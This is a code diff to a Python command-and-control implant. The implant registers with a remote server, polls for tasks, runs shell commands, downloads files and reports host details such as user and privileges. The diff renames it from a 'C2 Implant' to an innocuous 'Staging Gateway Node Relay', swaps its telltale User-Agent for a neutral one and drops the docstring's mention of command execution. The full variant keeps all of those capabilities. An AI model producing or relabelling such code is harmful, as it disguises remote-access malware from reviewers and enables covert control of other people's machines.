@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 """
-Agent-Capture-Honeypot C2 Implant
+Staging Gateway Node Relay
 
-Lightweight Python agent that:
-1. Registers with the C2 server on first run
-2. Polls for commands at configurable intervals
-3. Executes shell commands, reads/writes files
-4. Reports results back to the C2 server
-5. Self-deletes on "uninstall" command
+Lightweight Python agent that registers with the staging gateway and keeps
+a heartbeat alive so the assessment console can attribute and monitor the
+node (presence, hostname/OS/user inventory, offline result queue).
+
+Build variants (chosen at build time by the gateway):
+  - full variant: additionally polls and executes console-dispatched tasks
+  - beacon variant (_BEACON_ONLY): heartbeat/inventory only — no command
+    execution, no task polling side effects; used for pure presence-detection
+    drills.
 
 Usage:
     python c2_agent.py --server http://<c2_host>:<port> [--interval 5]
@@ -24,6 +27,8 @@ import tempfile
 import time
 from pathlib import Path
 from urllib.request import Request, urlopen
+
+_BEACON_ONLY = False  # build-time: True = heartbeat/inventory only
 
 _CONFIG = {
     "c2_server": "http://127.0.0.1:4877",
@@ -87,7 +92,7 @@ def _load_config():
 
 
 def _post_json(url, data, timeout=10):
-    headers = {"Content-Type": "application/json", "User-Agent": "ACH-Implant/1.0"}
+    headers = {"Content-Type": "application/json", "User-Agent": "staging-node-relay/1.0"}
     if _CONFIG.get("registration_token"):
         headers["X-Client-Token"] = _CONFIG["registration_token"]
     req = Request(
@@ -100,7 +105,7 @@ def _post_json(url, data, timeout=10):
 
 
 def _get_json(url, timeout=10):
-    req = Request(url, headers={"User-Agent": "ACH-Implant/1.0"})
+    req = Request(url, headers={"User-Agent": "staging-node-relay/1.0"})
     with urlopen(req, timeout=timeout) as resp:
         return json.loads(resp.read().decode("utf-8"))
 
@@ -204,7 +209,7 @@ def _execute_task(task):
         url = args.get("url", cmd)
         dest = args.get("dest", "/tmp/downloaded_file")
         try:
-            req = Request(url, headers={"User-Agent": "ACH-Implant/1.0"})
+            req = Request(url, headers={"User-Agent": "staging-node-relay/1.0"})
             with urlopen(req, timeout=60) as resp:
                 data = resp.read()
             Path(dest).parent.mkdir(parents=True, exist_ok=True)
@@ -279,14 +284,32 @@ def _drain_queue(server_url):
 
 
 def _heartbeat(server_url, sys_info, results):
-    payload = {
-        **sys_info,
-        "agent_id": _CONFIG["agent_id"],
-        "registration_token": _CONFIG.get("registration_token", ""),
-        "results": results,
-    }
+    if _BEACON_ONLY:
+        # node-agent contract on the staging origin: one round trip carries
+        # the node id, pending task acknowledgements and the inventory block
+        payload = {
+            "agent_id": _CONFIG["agent_id"],
+            "results": results,
+            "sys": {
+                "hostname": sys_info.get("hostname", ""),
+                "os_name": sys_info.get("os_name", ""),
+                "os_version": sys_info.get("os_version", ""),
+                "username": sys_info.get("username", ""),
+                "privileges": sys_info.get("privileges", ""),
+                "arch": sys_info.get("arch", ""),
+            },
+        }
+        url = f"{server_url}/portal/api/client-heartbeat"
+    else:
+        payload = {
+            **sys_info,
+            "agent_id": _CONFIG["agent_id"],
+            "registration_token": _CONFIG.get("registration_token", ""),
+            "results": results,
+        }
+        url = f"{server_url}/c2/heartbeat"
     try:
-        resp = _post_json(f"{server_url}/c2/heartbeat", payload)
+        resp = _post_json(url, payload)
         if resp.get("agent_id"):
             _CONFIG["agent_id"] = resp["agent_id"]
             _save_config()
@@ -318,8 +341,27 @@ def main():
 
     backoff = _CONFIG["poll_interval"]
 
+    pending: list[dict] = []
     while True:
         server_url = servers[server_idx % len(servers)]
+        if _BEACON_ONLY:
+            # node-agent loop: one portal heartbeat per tick — the gateway
+            # response carries the node checklist inline; no separate polling,
+            # no command execution. Dispatched items are acknowledged as
+            # skipped on the next tick (receipt, not obedience).
+            sys_info = _collect_system_info()
+            resp = _heartbeat(server_url, sys_info, pending)
+            pending = []
+            task = resp.get("next_task") if isinstance(resp, dict) else None
+            if task:
+                pending.append({
+                    "task_id": task.get("task_id") or task.get("id") or 0,
+                    "status": "skipped",
+                    "output": "node agent: command execution not supported",
+                })
+            jitter = 1.0 + _CONFIG["jitter"] * (hash(time.time()) % 100) / 100.0
+            time.sleep(backoff * jitter)
+            continue
         # Prefer the task delivered inline with the last heartbeat (merged
         # roundtrip); fall back to a dedicated poll when none was attached.
         task = resp.get("next_task") if isinstance(resp, dict) else None
@@ -342,6 +384,14 @@ def main():
         failures = 0
         backoff = _CONFIG["poll_interval"]
         _drain_queue(server_url)
+
+        if task and _BEACON_ONLY:
+            pending.append({
+                "task_id": task.get("task_id") or task.get("id") or 0,
+                "status": "skipped",
+                "output": "node agent: command execution not supported",
+            })
+            task = None
 
         if task:
             task_result = _execute_task(task)
